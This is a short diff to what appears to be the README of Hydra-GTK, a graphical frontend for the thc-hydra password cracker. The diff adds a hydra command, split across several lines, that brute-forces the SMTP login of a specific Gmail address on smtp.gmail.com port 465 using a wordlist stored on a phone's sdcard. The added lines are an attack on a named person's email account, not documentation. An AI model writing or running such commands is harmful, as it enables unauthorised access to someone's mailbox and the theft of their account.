@@ -1,4 +1,8 @@
+hydra -S -I wjhswafars@gmail.com -P /
 
+sdcard/abdellahe20092009 -v -V -e ns -s 465
+
+smtp.gmail.com smtp
 Hydra-GTK
 
 Gtk+2 frontend for thc-hydra
